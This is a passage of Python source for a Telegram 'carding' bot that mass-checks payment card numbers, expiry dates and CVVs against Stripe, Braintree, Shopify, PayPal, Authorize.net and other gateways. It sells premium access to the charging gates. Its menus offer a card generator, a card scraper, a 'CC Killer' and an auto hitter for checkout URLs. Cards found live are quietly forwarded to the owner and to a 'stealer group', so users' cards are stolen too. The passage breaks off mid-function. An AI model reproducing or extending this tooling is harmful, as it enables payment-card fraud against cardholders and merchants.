        if 'mass_check_gate' in context.user_data:
            del context.user_data['mass_check_gate']

# ============================================================================
# MASS CHECK WITH CARDS (for shortcuts)
# ============================================================================

async def mass_check_with_cards(update: Update, context: ContextTypes.DEFAULT_TYPE, cards_text: str):
    """Mass check with pre-extracted cards for shortcut commands"""
    user = update.effective_user
    gate_name = context.args[0].lower() if context.args else 'ss'
    
    valid_gates = {
        "ss": ("Stripe Auth $0.5", False),
        "bu": ("Braintree Auth $1", False),
        "sq": ("Square Auth", True),
        "pp": ("PayPal $1", True),
        "sor": ("Stripe $2", True),
        "st5": ("Stripe $5", True),
        "st12": ("Stripe $12", True),
        "str": ("Stripe $15", True),
        "dep": ("Stripe $49", True),
        "auz": ("Authorize.net $0", True),
        "asd": ("Authorize.net $7", True),
        "atf": ("Authorize.net $25", True),
        "anh": ("Authorize.net $200", True),
        "sh6": ("Shopify $6", True),
        "sh8": ("Shopify $8", True),
        "sh10": ("Shopify $10", True),
        "sh13": ("Shopify $13", True),
        "bt1": ("Braintree $1", True),
        "bt3d": ("Braintree 3D", True),
        "st1": ("Stripe $1", True)
    }
    
    if gate_name not in valid_gates:
        await update.message.reply_text(ae(f"❌ Invalid gate: {gate_name}"))
        return
    
    gate_display, requires_premium = valid_gates[gate_name]
    
    if requires_premium and not is_premium(user.id):
        await update.message.reply_text(
            get_premium_denied_message(user.id),
            parse_mode=ParseMode.HTML
        )
        return
    
    cards = extract_cards_from_text(cards_text)
    if not cards:
        await update.message.reply_text(ae("❌ No valid cards found!"))
        return
    
    limit = get_mass_check_limit(user.id)
    cards = cards[:limit]
    
    loading_msg = await update.message.reply_text(
        f"⏳ <b>Processing {len(cards)} cards on {gate_display}...</b>",
        parse_mode=ParseMode.HTML
    )
    
    approved = []
    declined = []
    _sem2 = asyncio.Semaphore(5)

    async def _check_one_text(card):
        async with _sem2:
            try:
                parts = card.split('|')
                if len(parts) >= 4:
                    cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
                    result = await asyncio.to_thread(check_card_php, gate_name, cc, mm, yy, cvv, user.id)
                    return card, result
                return card, {'status': 'error', 'message': 'Invalid format'}
            except Exception as e:
                return card, {'status': 'error', 'message': str(e)}

    results = await asyncio.gather(*[_check_one_text(card) for card in cards])
    for card, result in results:
        if result.get('status') in ['approved', 'charged', 'cvv_match']:
            approved.append((card, result))
        else:
            declined.append((card, result))

    result_text = f"📋 <b>MASS CHECK RESULTS - {gate_display}</b>\n\n"
    result_text += f"✅ Approved: {len(approved)}\n"
    result_text += f"❌ Declined: {len(declined)}\n\n"

    if approved:
        result_text += "<b>✅ APPROVED CARDS:</b>\n"
        for card, res in approved[:10]:
            result_text += f"<code>{card}</code>\n"

    await loading_msg.edit_text(result_text, parse_mode=ParseMode.HTML)

# ============================================================================
# MASS CHECK & TXT FILE PROCESSING
# ============================================================================

async def mass_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass check multiple cards - Available for all approved users"""
    user = update.effective_user
    
    # Check if banned
    if is_banned(user.id):
        gif_url = get_sexy_anime_gif("banned")
        await update.message.reply_animation(
            animation=gif_url,
            caption=ae("🚫 <b>YOU ARE BANNED!</b>\n\nYou cannot use this bot."),
            parse_mode=ParseMode.HTML
        )
        return
    
    # Check if approved
    if not is_approved(user.id):
        await update.message.reply_text(
            "⏳ <b>Access Pending</b>\n\n"
            "Your request has been sent to the owner.\n"
            "Please wait for approval.\n\n"
            f"Contact: @{SUPPORT_USERNAME}",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Get user limit
    limit = get_mass_check_limit(user.id)
    rank = get_user_rank(user.id)
    
    # Check if message has text with cards
    if not context.args:
        await update.message.reply_text(
            f"📋 <b>MASS CHECK - ONICHAN</b>\n\n"
            f"💎 <b>Your Status:</b> {rank}\n"
            f"📊 <b>Your Limit:</b> {limit} cards per check\n\n"
            f"🎯 <b>Usage:</b>\n"
            f"<code>/mass gate_name</code>\n"
            f"Then send cards (one per line or all together)\n\n"
            f"💡 <b>Example:</b>\n"
            f"<code>/mass ss</code>\n"
            f"<code>4242424242424242|12|25|123</code>\n"
            f"<code>5555555555554444|01|26|456</code>\n\n"
            f"📁 <b>Or send a .txt file with cards!</b>\n\n"
            f"🆓 Free: {MASS_CHECK_LIMITS['free']} cards\n"
            f"💎 Premium: {MASS_CHECK_LIMITS['premium']} cards\n"
            f"👑 Owner: {MASS_CHECK_LIMITS['owner']} cards",
            parse_mode=ParseMode.HTML
        )
        return
    
    gate_name = context.args[0].lower()
    
    # Validate gate
    valid_gates = {
        # Free Gates
        "ss": ("Stripe Auth $0.5", False),
        "bu": ("Braintree Auth $1", False),
        "sq": ("Square Auth", True),
        
        # Premium Gates
        "pp": ("PayPal $1", True),
        "sor": ("Stripe $2", True),
        "st5": ("Stripe $5", True),
        "st12": ("Stripe $12", True),
        "str": ("Stripe $15", True),
        "dep": ("Stripe $49", True),
        "auz": ("Authorize.net $0", True),
        "asd": ("Authorize.net $7", True),
        "atf": ("Authorize.net $25", True),
        "anh": ("Authorize.net $200", True),
        "sh6": ("Shopify $6", True),
        "sh8": ("Shopify $8", True),
        "sh10": ("Shopify $10", True),
        "sh13": ("Shopify $13", True),
        "bt1": ("Braintree $1", True),
        "bt3d": ("Braintree 3D", True),
        "st1": ("Stripe $1", True)
    }
    
    if gate_name not in valid_gates:
        await update.message.reply_text(
            f"❌ Invalid gate!\n\n"
            f"Available gates: {', '.join(valid_gates.keys())}",
            parse_mode=ParseMode.HTML
        )
        return
    
    gate_display, requires_premium = valid_gates[gate_name]
    
    # Check premium requirement
    if requires_premium and not is_premium(user.id):
        gif_url = get_sexy_anime_gif("premium")
        await update.message.reply_animation(
            animation=gif_url,
            caption=get_premium_denied_message(user.id),
            parse_mode=ParseMode.HTML
        )
        return
    
    # Extract cards from message
    message_text = update.message.text
    cards = extract_cards_from_text(message_text)
    
    if not cards:
        await update.message.reply_text(
            f"❌ No valid cards found!\n\n"
            f"Send cards in format: CC|MM|YY|CVV",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Apply limit
    if len(cards) > limit:
        await update.message.reply_text(
            f"⚠️ <b>LIMIT EXCEEDED!</b>\n\n"
            f"You can check max {limit} cards at once.\n"
            f"Found {len(cards)} cards in your message.\n\n"
            f"💎 Upgrade to premium for higher limits!",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Start mass checking
    status_msg = await update.message.reply_text(
        f"🎀 <b>Mass Check Started</b>\n\n"
        f"Gateway: {gate_display}\n"
        f"Cards: {len(cards)}\n\n"
        f"⏳ <b>Processing...</b>",
        parse_mode=ParseMode.HTML
    )
    
    # Check each card concurrently (up to 5 at a time) without blocking the event loop
    approved = []
    declined = []
    _sem3 = asyncio.Semaphore(5)

    async def _check_one_mass(idx, cc, mm, yy, cvv):
        async with _sem3:
            return idx, cc, mm, yy, cvv, await asyncio.to_thread(check_card_php, gate_name, cc, mm, yy, cvv, user.id)

    _tasks3 = [_check_one_mass(i, cc, mm, yy, cvv) for i, (cc, mm, yy, cvv) in enumerate(cards, 1)]
    for coro in asyncio.as_completed(_tasks3):
        i, cc, mm, yy, cvv, result = await coro

        card_str = f"{cc}|{mm}|{yy}|{cvv}"

        card_is_approved = False  # Initialize variable (renamed to avoid shadowing)
        if result["status"] == "success":
            msg = result.get("message", "")
            card_is_approved = "approved" in msg.lower() or "success" in msg.lower() or "charged" in msg.lower()

            if card_is_approved:
                approved.append(card_str)

                # Log, send to stealer, and notify owner instantly with GIF
                try:
                    from modules.gate_checker import get_bin_info
                    bin_info = await asyncio.to_thread(get_bin_info, cc)
                    log_approved_card(user.id, user.username or user.first_name, cc, mm, yy, cvv, gate_name, msg, bin_info)
                    await send_to_stealer_group(context.bot, cc, mm, yy, cvv, gate_name, msg, bin_info, user.id, user.username or user.first_name)
                    await send_approved_card_with_gif(update, card_str, gate_name, msg, 3.0, bin_info)
                    
                    gate_names = {
                        'ss': 'StripeAuth', 'bu': 'BraintreeAuth', 'sq': 'SquareAuth',
                        'pp': 'PayPalCharge', 'sor': 'StripeCharge', 'st5': 'StripeCharge',
                        'st12': 'StripeCharge', 'str': 'StripeCharge', 'dep': 'StripeCharge',
                        'auz': 'AuthorizeNet', 'asd': 'AuthorizeNet', 'atf': 'AuthorizeNet', 'anh': 'AuthorizeNet',
                        'sh6': 'ShopifyCharge', 'sh8': 'ShopifyCharge', 'sh10': 'ShopifyCharge', 'sh13': 'ShopifyCharge',
                        'bt1': 'BraintreeCharge', 'bt3d': 'Braintree3D'
                    }
                    
                    gate_tag = gate_names.get(gate_name, gate_name.upper())
                    user_rank = get_user_rank(user.id)
                    
                    # Send success sticker
                    try:
                        success_stickers = [
                            "CAACAgIAAxkBAAEBXXxnLqK5AAFxQwABvZGxMjYAAWxvAAGxAAJEAAOWr4lHYwABd0K9AAFxMQQ",
                            "CAACAgIAAxkBAAEBXX5nLqLBAAHvAAGqAAFLAAFxMjYAAWxvAAGxAAJFAAOWr4lHYwABd0K9AAFxMQQ"
                        ]
                        await context.bot.send_sticker(
                            chat_id=OWNER_ID,
                            sticker=random.choice(success_stickers)
                        )
                    except:
                        pass
                    
                    owner_msg = f"""<b>Onichan:</b>
<b>#{gate_tag}</b>
━━━━━━━━━━━━━━━━━━━━━━

<b>[✓] Card ➜</b> <code>{cc}|{mm}|{yy}|{cvv}</code>
<b>[✓] Status ➜ Charged 🔥</b>
<b>[✓] Response ➜ {msg} 🎉</b>
<b>[✓] Gateway ➜ {gate_display}</b>
━━━━━━━━━━━━━━━━━━━━━━

<b>[✓] Info ➜ {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}</b>
<b>[✓] Bank ➜ {bin_info['bank']}</b>
<b>[✓] Country ➜ {bin_info['country']} {bin_info['emoji']}</b>
━━━━━━━━━━━━━━━━━━━━━━

<b>[✓] Checked By ➜ @{user.username or user.first_name} [{user_rank}]</b>
<b>[Δ] Dev ➜ Onichan</b>"""
                    
                    await context.bot.send_message(
                        chat_id=OWNER_ID,
                        text=owner_msg,
                        parse_mode=ParseMode.HTML
                    )
                except Exception as e:
                    print(f"Error notifying owner in mass check: {e}")
            else:
                declined.append(card_str)
        else:
            declined.append(card_str)
        
        # Update progress every card
        try:
            progress_bar = "🟦" * i + "⬜" * (len(cards) - i)
            await status_msg.edit_text(
                f"Progress: {i}/{len(cards)} | ✅ {len(approved)} | ❌ {len(declined)}\n"
                f"<b>{progress_bar[:20]}</b>",
                parse_mode=ParseMode.HTML
            )
        except:
            pass
    
    # Send final results with bank details
    result_text = f"""🎀 <b>Mass Check Complete</b>

Gateway: {gate_display}
Total: {len(cards)} | ✅ {len(approved)} | ❌ {len(declined)}

"""
    
    if approved:
        result_text += "<b>Approved Cards:</b>\n\n"
        
        # Show approved cards with bank details
        for i, card_str in enumerate(approved[:10], 1):
            result_text += f"<b>{i}.</b> <code>{card_str}</code>\n"
            
            # Get BIN info for this card
            try:
                from modules.gate_checker import get_bin_info
                cc_parts = card_str.split('|')
                if len(cc_parts) >= 1:
                    bin_info = get_bin_info(cc_parts[0])
                    result_text += f"   <b>├─</b> {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}\n"
                    result_text += f"   <b>├─</b> {bin_info['bank']}\n"
                    result_text += f"   <b>├─</b> {bin_info['country']} {bin_info['emoji']}\n\n"
            except:
                result_text += "\n"
        
        if len(approved) > 10:
            result_text += f"<i>...and {len(approved) - 10} more approved cards</i>\n\n"
    
    
    await status_msg.edit_text(result_text, parse_mode=ParseMode.HTML)

@require_approval
async def handle_txt_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle uploaded .txt files with cards"""
    user = update.effective_user
    
    # Check if message has document
    if not update.message.document:
        return
    
    document = update.message.document
    
    # Check if it's a txt file
    if not document.file_name.endswith('.txt'):
        return
    
    # Get user limit
    limit = get_mass_check_limit(user.id)
    rank = get_user_rank(user.id)
    
    # Download file
    try:
        file = await context.bot.get_file(document.file_id)
        file_content = await file.download_as_bytearray()
        text_content = file_content.decode('utf-8', errors='ignore')
    except Exception as e:
        await update.message.reply_text(ae(f"❌ Error reading file: {str(e)}"))
        return
    
    # Extract cards
    cards = extract_cards_from_text(text_content)
    
    if not cards:
        await update.message.reply_text(
            "❌ No valid cards found in file!\n\n"
            "Format should be: CC|MM|YY|CVV",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Apply limit
    total_found = len(cards)
    cards = cards[:limit]  # Limit cards
    
    # Show extracted cards
    sep = "━━━━━━━━━━━━━━━━━━━━"
    result_text = f"""💜 <b>ONICHAN • TXT UPLOAD</b>
{sep}
📄 <b>File</b>      : {document.file_name}
📊 <b>Found</b>     : {total_found}
✅ <b>Extracted</b> : {len(cards)}
💎 <b>Your Status:</b> {rank}
🔒 <b>Your Limit:</b> {limit} cards

━━━━━━━━━━━━━━━━━━━━━━

💳 <b>EXTRACTED CARDS:</b>

"""
    
    for i, (cc, mm, yy, cvv) in enumerate(cards[:20], 1):  # Show max 20
        result_text += f"{i}. <code>{cc}|{mm}|{yy}|{cvv}</code>\n"
    
    if len(cards) > 20:
        result_text += f"\n<i>...and {len(cards) - 20} more cards</i>\n"
    
    result_text += f"""
━━━━━━━━━━━━━━━━━━━━━━

🎯 <b>To check these cards:</b>
<code>/mass gate_name</code>

Then paste the cards above!

💡 <b>Example:</b>
<code>/mass ss</code>
(then paste cards)

━━━━━━━━━━━━━━━━━━━━━━

👤 <b>Uploaded by:</b> @{user.username or user.first_name}
"""
    
    if total_found > limit:
        result_text += f"\n⚠️ <b>Note:</b> Only first {limit} cards extracted due to your limit.\n💎 Upgrade to premium for more!"
    
    gif_url = get_sexy_anime_gif("success")
    await update.message.reply_animation(
        animation=gif_url,
        caption=result_text,
        parse_mode=ParseMode.HTML
    )

# ============================================================================
# CALLBACK QUERY HANDLER
# ============================================================================

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button callbacks"""
    query = update.callback_query
    await query.answer()
    
    user = query.from_user
    rank = get_user_rank(user.id)
    
    async def safe_edit(text, reply_markup=None):
        text = ae(text)
        try:
            await query.edit_message_text(
                text=text, parse_mode=ParseMode.HTML, reply_markup=reply_markup)
        except:
            try:
                await query.edit_message_caption(
                    caption=text, parse_mode=ParseMode.HTML, reply_markup=reply_markup)
            except:
                try:
                    await query.message.reply_text(
                        text=text, parse_mode=ParseMode.HTML, reply_markup=reply_markup)
                except:
                    pass

    async def send_gif_screen(text, reply_markup=None, gif_type="welcome"):
        """Delete current message and send a fresh animation — adds GIF to every screen."""
        text = ae(text)
        gif_url = get_sexy_anime_gif(gif_type)
        chat_id = query.message.chat_id  # capture before delete
        try:
            await query.message.delete()
        except Exception:
            pass
        if not gif_url:
            # GIF cache cold — send plain text message as fallback
            try:
                await context.bot.send_message(
                    chat_id=chat_id, text=text,
                    parse_mode=ParseMode.HTML, reply_markup=reply_markup)
            except Exception:
                pass
            return
        try:
            await context.bot.send_animation(
                chat_id=chat_id,
                animation=gif_url,
                caption=text,
                parse_mode=ParseMode.HTML,
                reply_markup=reply_markup
            )
        except Exception:
            # fallback: send plain text when animation fails
            try:
                await context.bot.send_message(
                    chat_id=chat_id, text=text,
                    parse_mode=ParseMode.HTML, reply_markup=reply_markup)
            except Exception:
                pass
    
    # Regenerate cards
    if query.data == "regen_cards":
        await regenerate_cards_callback(update, context)
        return
    
    # Admin panel
    if query.data == "admin":
        await admin_panel(update, context)
        return
    
    # ============================================================
    # GATES MENU
    # ============================================================
    if query.data == "gates":
        keyboard = [
            [_btn("Auto Stripe Auth", icon=EID["bolt"], callback_data="gate_ast"), _btn("Stripe $5", icon=EID["card"], callback_data="gate_stripe5")],
            [_btn("Braintree", icon=EID["bolt"], callback_data="gate_braintree"), _btn("VBV/3DS", icon=EID["3ds"], callback_data="gate_vbv3ds")],
            [_btn("Stripe Auth", icon=EID["bolt"], callback_data="gate_stripe_newrp"), _btn("Stripe $1", icon=EID["card"], callback_data="gate_stripe1")],
            [_btn("PayPal", icon=EID["card"], callback_data="gate_paypal"), _btn("Auto Shopify", icon=EID["bolt"], callback_data="gate_auto_shopify")],
            [_btn("Razorpay", icon=EID["card"], callback_data="gate_razorpay"), _btn("Shopify V2", icon=EID["bolt"], callback_data="gate_shopify_v2")],
            [_btn("PayU ₹1", icon=EID["card"], callback_data="gate_payu"), _btn("CC Killer", icon=EID["danger"], callback_data="gate_cc_killer")],
            [_btn("⬛ Square Auth", icon=EID["card"], callback_data="gate_square_auth"), _btn("⚡ Auto Hitter", icon=EID["bolt"], callback_data="gate_auto_hitter")],
            [_btn("BACK", style="default", icon=EID["back"], callback_data="start")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        # Delete old message and send fresh animation for the gates menu.
        gif_url = get_sexy_anime_gif("welcome")
        gates_chat_id = query.message.chat_id
        try:
            await query.message.delete()
        except Exception:
            pass
        gates_caption = ae("<b>💜 Select a Gate</b>")
        if gif_url:
            try:
                await context.bot.send_animation(
                    chat_id=gates_chat_id, animation=gif_url,
                    caption=gates_caption, parse_mode=ParseMode.HTML,
                    reply_markup=reply_markup)
            except Exception:
                await context.bot.send_message(
                    chat_id=gates_chat_id, text=gates_caption,
                    parse_mode=ParseMode.HTML, reply_markup=reply_markup)
        else:
            await context.bot.send_message(
                chat_id=gates_chat_id, text=gates_caption,
                parse_mode=ParseMode.HTML, reply_markup=reply_markup)

    # Individual Gate Info Screens — edit the caption of the animation (GIF stays, caption changes)
    elif query.data in (
        "gate_stripe5", "gate_braintree", "gate_ast", "gate_vbv3ds",
        "gate_paypal", "gate_auto_shopify", "gate_stripe_newrp",
        "gate_razorpay", "gate_payu", "gate_shopify_v2",
        "gate_stripe1", "gate_auto_hitter", "gate_cc_killer",
        "gate_square_auth"
    ):
        gate_texts = {
            "gate_stripe5": ae("""<b>Stripe $5</b>

▸ /st5 cc|mm|yy|cvv — Single Check
▸ /mst5 — Mass Check"""),
            "gate_braintree": ae("""<b>Braintree</b>

▸ /b3 cc|mm|yy|cvv — Single Check
▸ /b3n cc|mm|yy|cvv — Braintree $5.00
▸ /mb3 — Mass Check"""),
            "gate_ast": ae("""<b>Auto Stripe Auth</b>

▸ /ast cc|mm|yy|cvv — Single Check
▸ /mast — Mass Check (5 batches)"""),
            "gate_vbv3ds": ae("""<b>VBV/3DS</b>

▸ /bt3d cc|mm|yy|cvv — Single Check
▸ /mbt3d — Mass Check"""),
            "gate_paypal": ae("""<b>PayPal</b>

▸ /pp cc|mm|yy|cvv — Single Check
▸ /ppv cc|mm|yy|cvv — Variable Price ($0.01)
▸ /mpp — Mass Check"""),
            "gate_auto_shopify": ae("""<b>Shopify</b>

▸ /sh cc|mm|yy|cvv — Single Check
▸ /msh — Mass Check
▸ /mshtxt — Mass Check via .txt file"""),
            "gate_stripe_newrp": ae("""<b>Stripe Auth</b>

▸ /st cc|mm|yy|cvv — Single Check
▸ /str cc|mm|yy|cvv — Stripe $1 Donation
▸ /mst — Mass Check (5 batches)
▸ /msttxt — Mass Check via .txt file"""),
            "gate_razorpay": ae("""<b>Razorpay ₹1</b>

▸ /rz cc|mm|yy|cvv — Single Check
▸ /mrz — Mass Check (5 batches)"""),
            "gate_payu": ae("""<b>PayU ₹1</b>

▸ /payu cc|mm|yy|cvv — Single Check
▸ /mpayu — Mass Check (1s delay)

💡 Uses MiracleManna donation gateway"""),
            "gate_shopify_v2": ae("""<b>Shopify V2</b>

▸ /sh6 cc|mm|yy|cvv — Single Check
▸ /msh6 — Mass Check"""),
            "gate_stripe1": ae("""<b>Stripe $1</b>

▸ /st1 cc|mm|yy|cvv — Single Check
▸ /mst1 — Mass Check"""),
            "gate_auto_hitter": ae("""<b>⚡ Auto Hitter — /hit</b>

▸ /hit — Open dashboard
▸ /hit url — Auto-detect & hit a URL
▸ /hit url cc|mm|yy|cvv — Hit with card

<b>Dashboard:</b>
• Hit Cards · My Hits · Status
• Ranking · Saved BINs · Settings

<code>/hit https://checkout.stripe.com/... 4|12|25|123</code>"""),
            "gate_cc_killer": ae("""<b>💀 CC Killer Gate</b>

▸ /kill cc|mm|yy|cvv — Kill a card

Uses bli-us.com membership gateway.

• Processed (X) ✅🔥 — Card killed
• Card is still live try again 😭 — Live

<code>/kill 4242424242424242|12|25|123</code>"""),
            "gate_square_auth": ae("""<b>⬛ Square Auth Gate</b>  💎 <i>Premium</i>

▸ /sq CC|MM|YY|CVV — Single Check
▸ /sq (reply to .txt) — Mass Check from file
▸ /msq CC|MM|YY|CVV … — Mass Check inline
▸ /msqtxt (reply to .txt) — Mass Check via file

Checks cards against Square Payment Gateway.
• APPROVED / CVV MATCHED → Live card ✅
• DECLINED / INVALID → Dead card ❌

<code>/sq 4242424242424242|12|25|123</code>"""),
        }
        text = gate_texts[query.data]
        keyboard = [[_btn("BACK", style="default", icon=EID["back"], callback_data="gates")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        try:
            await query.message.edit_caption(
                caption=text, parse_mode=ParseMode.HTML, reply_markup=reply_markup)
        except Exception:
            await safe_edit(text, reply_markup)

    # AUTH GATES
    elif query.data == "auth_gates":
        sep = "━━━━━━━━━━━━━━━━━━━━"
        text = ae(f"""💜 <b>ONICHAN • FREE GATES</b>
{sep}
⚡ /ss — Stripe Auth $0.5
🌊 /bu — Braintree Auth $1
🔷 /sq — Square Auth $0
{sep}
<code>/ss cc|mm|yy|cvv</code>
/mss · /msstxt
{sep}""")
        
        keyboard = [[_btn("BACK", style="default", icon=EID["back"], callback_data="gates")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await send_gif_screen(text, reply_markup)

    # CHARGE GATES
    elif query.data == "charge_gates":
        if not is_premium(user.id):
            text = get_premium_denied_message(user.id)
            
            keyboard = [
                [_btn("Buy Premium", icon=EID["crown"], url=f"https://t.me/{SUPPORT_USERNAME}")],
                [_btn("BACK", style="default", icon=EID["back"], callback_data="gates")]
            ]
        else:
            sep = "━━━━━━━━━━━━━━━━━━━━"
            text = ae(f"""💜 <b>ONICHAN • PREMIUM GATES</b>
{sep}
💰 /pp PayPal $1
⚡ /sor $2 · /st5 $5 · /st12 $12 · /str $15 · /dep $49
🏛 /auz $0 · /asd $7 · /atf $25 · /anh $200
🛍 /sh6 $6 · /sh8 $8 · /sh10 $10 · /sh13 $13
🌊 /bt1 $1 · /bt3d 3D
📱 /stm Mass Auth
{sep}""")
            
            keyboard = [[_btn("BACK", style="default", icon=EID["back"], callback_data="gates")]]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        await send_gif_screen(text, reply_markup)

    # MASS CHECK INFO
    elif query.data == "mass_info":
        sep = "━━━━━━━━━━━━━━━━━━━━"
        text = ae(f"""💜 <b>ONICHAN • MASS CHECK</b>
{sep}
📊 Free:5 | Premium:20 | Owner:50
{sep}
<code>/mass ss
cc1|mm|yy|cvv
cc2|mm|yy|cvv</code>
{sep}
⚡ /mss · /mbu · /msq · /mpp · /msor
📁 /msstxt · /mpptxt · /mbutxt
{sep}
💎 @{SUPPORT_USERNAME}""")
        
        keyboard = [[_btn("BACK", style="default", icon=EID["back"], callback_data="gates")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await send_gif_screen(text, reply_markup)

    # TOOLS MENU
    elif query.data == "tools":
        sep = "━━━━━━━━━━━━━━━━━━━━"
        text = ae(f"""💜 <b>ONICHAN • TOOLS</b>
{sep}
🎴 /gen 424242 — Card Generator
🔍 /bin 424242 — BIN Lookup
🧹 /clean — CC Cleaner
📡 /scr channel — CC Scraper
{sep}
✨ All tools are free!""")
        
        keyboard = [[_btn("BACK", style="default", icon=EID["back"], callback_data="start")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await send_gif_screen(text, reply_markup)

    # HELP MENU
    elif query.data == "help_menu":
        is_premium_user = is_premium(user.id)
        is_owner_user   = is_owner(user.id)
        sep = "━━━━━━━━━━━━━━━━━━━━"
        text = ae(f"""💜 <b>ONICHAN • HELP</b>
{sep}
👤 {rank} | 📊 Limit: {get_mass_check_limit(user.id)} cards
{sep}
🔰 <b>BASIC</b>
/start · /help · /info · /redeem
{sep}
🚪 <b>FREE GATES</b>
/st Stripe · /bu Braintree · /sq Square
{sep}
🔧 <b>TOOLS</b>
/gen · /bin · /fake · /web · /proxy
/scr · /tmail · /cmail · /sk · /config
{sep}
🧹 <b>CLEANER</b>
/clean · /filter
{sep}
📋 <b>MASS</b> (Free:5 | Prem:20 | Owner:50)
/mss · /mpp · /mbu · /msstxt
{sep}""")
        if is_premium_user:
            text += ae(f"""
💎 <b>PREMIUM GATES</b>
/pp · /ppv · /str · /b3n · /rz
/sor · /st5 · /dep · /auz · /sh6
{sep}
🎯 <b>AUTO HITTER</b>
/hit [url] [cc] — Stripe Checkout
{sep}""")
        if is_owner_user:
            text += ae(f"""
👑 <b>ADMIN</b>
/approve · /premium · /ban · /unban
/addadmin · /genkey · /keys · /broadcast
{sep}""")
        text += ae(f"\n📞 @{SUPPORT_USERNAME} | 📢 @{CHANNEL_USERNAME}")
        keyboard = [[_btn("BACK", style="default", icon=EID["back"], callback_data="start")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await send_gif_screen(text, reply_markup)

    # INFO
    elif query.data == "info":
        sep = "━━━━━━━━━━━━━━━━━━━━"
        text = ae(f"""💜 <b>ONICHAN • INFO</b>
{sep}
📛 <b>Name</b>   : {user.first_name}
👤 <b>User</b>   : @{user.username or 'None'}
🆔 <b>ID</b>     : <code>{user.id}</code>
💎 <b>Status</b> : {rank}
{sep}
⚡ @{BOT_USERNAME}""")
        
        keyboard = [[_btn("BACK", style="default", icon=EID["back"], callback_data="start")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await send_gif_screen(text, reply_markup)

    # PREMIUM INFO
    elif query.data == "premium":
        sep = "━━━━━━━━━━━━━━━━━━━━"
        text = ae(f"""💜 <b>ONICHAN • PREMIUM</b>
{sep}
📦 <b>1 Week</b>   — $3
📦 <b>2 Weeks</b>  — $5
📦 <b>1 Month</b>  — $10 ⭐
📦 <b>3 Months</b> — $25
{sep}
✅ 20 mass cards · All gates · No cooldown
{sep}
💳 Choose payment method:""")
        
        keyboard = [
            [_btn("Pay with TON", icon=EID["crown"], callback_data="pay_ton")],
            [_btn("Pay with Stars", icon=EID["bolt"], callback_data="pay_stars")],
            [_btn("Pay with Crypto", icon=EID["card"], callback_data="pay_crypto")],
            [_btn("Pay with UPI", icon=EID["card"], callback_data="pay_upi")],
            [_btn("Contact Owner", style="default", icon=EID["users"], url=f"https://t.me/{SUPPORT_USERNAME}")],
            [_btn("BACK", style="default", icon=EID["back"], callback_data="start")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await send_gif_screen(text, reply_markup)

    # PAY WITH UPI (Easebuzz)
    elif query.data == "pay_upi":
        from modules.easebuzz import UPI_PLANS
        import os
        
        easebuzz_key = os.environ.get('EASEBUZZ_KEY', '')
        if not easebuzz_key:
            text = ae("""🇮🇳 <b>UPI PAYMENT</b>

━━━━━━━━━━━━━━━━━━━━━━

⚠️ UPI payments are currently unavailable.
Please use Crypto or Telegram Stars instead.

━━━━━━━━━━━━━━━━━━━━━━""")
            keyboard = [
                [_btn("Pay with Crypto", icon=EID["card"], callback_data="pay_crypto")],
                [_btn("Pay with Stars", icon=EID["bolt"], callback_data="pay_stars")],
                [_btn("BACK", style="default", icon=EID["back"], callback_data="premium")]
            ]
        else:
            text = """🇮🇳 <b>PAY WITH UPI</b>

━━━━━━━━━━━━━━━━━━━━━━

Pay instantly with any UPI app!
GPay, PhonePe, Paytm, BHIM & more

━━━━━━━━━━━━━━━━━━━━━━

📦 <b>1 Week</b> - ₹99
📦 <b>2 Weeks</b> - ₹149
📦 <b>1 Month</b> - ₹249 (Best!)
📦 <b>3 Months</b> - ₹599

━━━━━━━━━━━━━━━━━━━━━━"""
            keyboard = [
                [_btn("1 Week - ₹99", icon=EID["card"], callback_data="upi_1_week")],
                [_btn("2 Weeks - ₹149", icon=EID["card"], callback_data="upi_2_weeks")],
                [_btn("1 Month - ₹249", icon=EID["crown"], callback_data="upi_1_month")],
                [_btn("3 Months - ₹599", icon=EID["card"], callback_data="upi_3_months")],
                [_btn("BACK", style="default", icon=EID["back"], callback_data="premium")]
            ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await send_gif_screen(text, reply_markup)

    # UPI PAYMENT (Easebuzz)
    elif query.data.startswith("upi_"):
        plan_key = query.data.replace("upi_", "")
        
        from modules.easebuzz import UPI_PLANS, create_payment
        import os
        
        if plan_key not in UPI_PLANS:
            await query.answer("Invalid plan!", show_alert=True)
            return
        
        await query.answer("Creating UPI payment...", show_alert=False)
        
        domain = os.environ.get("REPLIT_DEPLOYMENT_URL") or os.environ.get("REPLIT_DEV_DOMAIN", "")
        if domain and not domain.startswith("http"):
            domain = f"https://{domain}"
        
        success_url = f"{domain}/webhook/easebuzz/success" if domain else ""
        failure_url = f"{domain}/webhook/easebuzz/failure" if domain else ""
        
        result = create_payment(
            user_id=user.id,
            plan_key=plan_key,
            username=user.username or user.first_name or "User",
            success_url=success_url,
            failure_url=failure_url
        )
        
        if result.get("success"):
            plan = UPI_PLANS[plan_key]
            text = ae(f"""🇮🇳 <b>UPI PAYMENT ORDER</b>

━━━━━━━━━━━━━━━━━━━━━━

📦 <b>Plan:</b> {plan['name']}
💵 <b>Amount:</b> {plan['inr']}
⏰ <b>Duration:</b> {plan['duration_days']} days

━━━━━━━━━━━━━━━━━━━━━━

📋 <b>Order ID:</b> <code>{result['txnid']}</code>

━━━━━━━━━━━━━━━━━━━━━━

🏧 <b>Pay with GPay, PhonePe, Paytm!</b>

✅ Premium activates automatically!
⏰ Order expires in 15 minutes

━━━━━━━━━━━━━━━━━━━━━━""")
            
            keyboard = [
